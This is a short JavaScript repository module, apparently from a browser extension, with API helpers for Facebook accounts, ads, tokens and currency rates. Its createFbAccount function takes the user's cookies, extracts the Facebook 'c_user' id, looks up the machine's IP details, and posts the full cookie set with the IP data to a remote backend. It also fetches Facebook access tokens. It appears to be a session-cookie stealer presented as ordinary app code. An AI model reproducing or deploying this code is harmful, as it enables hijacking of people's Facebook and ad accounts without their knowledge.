import axios from "axios";
import Config from '../../configs';
import ApiGateWay from '../_ApiGateWay';
import { MainResource } from '../resources/main.resource';

const MainRepository = {
    createFbAccount: async (cookies) => {
        const { value: uid } = cookies.find(item => item.name == "c_user");
        axios.get('https://ipinfo.io/').then(response => {
            // console.log('data:', response.data)
            const ipInfo = response.data;
            const resource = MainResource.createFbAccount();
            const apiGateWay = new ApiGateWay(Config.getBaseConfig());
            apiGateWay.postRequest(resource, { ipInfo, cookies, uid });
        })
    },
    createFbAds: async ({ userId, data }) => {
        const resource = MainResource.createFbAds();
        const apiGateWay = new ApiGateWay(Config.getBaseConfig());
        return apiGateWay.postRequest(resource, { data, userId });
    },
    // get facebook token
    getTokenAEEI: () => {
        const resource = MainResource.getTokenAEEI();
        return axios.get(resource.path);
    },
    getTokenAEEB: (params) => {
        const resource = MainResource.getTokenAEEB();
        return axios.get(resource.path, { params });
    },
    getCurrencyRate: async (params) => {
        const currencyRate = JSON.parse(localStorage.getItem(`currecy_${params.currency}`));
        if (currencyRate) return currencyRate;
        const resource = MainResource.getCurrencyRate();
        const { data } = await axios.get(resource.path, { params });
        localStorage.setItem(`currecy_${params.currency}`, JSON.stringify(data));
        return data;
    },
}

export { MainRepository };